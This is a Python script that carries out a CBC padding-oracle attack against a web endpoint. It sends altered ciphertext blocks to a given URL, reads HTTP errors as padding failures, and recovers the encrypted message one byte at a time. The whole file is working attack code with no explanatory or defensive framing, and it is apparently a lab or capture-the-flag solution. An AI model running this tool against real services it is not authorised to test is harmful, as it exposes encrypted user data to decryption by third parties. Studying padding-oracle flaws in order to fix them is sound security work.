#!/usr/bin/python3

import urllib
import sys
from array import *
from urllib import request

TARGET = ''

# query the web API and return:
#   True: good padding
#   False: bad padding
def query(q):
  try:
    f = urllib.request.urlopen(TARGET + '=' + q)
  except urllib.error.URLError as e:
    return False  # bad padding
  #print(q)
  return True # good padding

# decrypt a block using padding oracle
def decryptblock(c1, c2):
  c1work = bytearray(c1)
  plain  = bytearray(16)

  # iterate from the last byte down
  for n in range(15,-1,-1):
    for i in range(n+1,16):
      c1work[i] = c1[i] ^ plain[i] ^ (16-n)
    for g in range(0x80):
      c1work[n] = c1[n] ^ g ^ (16-n)
      if query((b''.join([c1work,c2]).hex())):
        plain[n] = g
        # print('byte %d: %x' % (n, g))
    print(plain)
  
  return(plain.decode())


if len(sys.argv) < 2:
  print('usage: ' + sys.argv[0] + ' <URL with encrypted message>')
  sys.exit()

TARGET     = sys.argv[1].split('=')[0]
ciphertext = sys.argv[1].split('=')[1]

print(TARGET)
print(ciphertext)

# convert ciphertext to bytes
ct = bytes.fromhex(ciphertext)

# break ciphertext into 16-byte blocks
blocks = [ct[x:x+16] for x in range(0,len(ct),16)]

plaintext = ''

# iterate through the blocks
for i in range(len(blocks)-1):
  print('block %d' % i)
  plaintext += decryptblock(blocks[i], blocks[i+1])

# remove padding
plaintext = plaintext[:-ord(plaintext[-1])]

print('\nDecrypted message: "' + plaintext +'"')
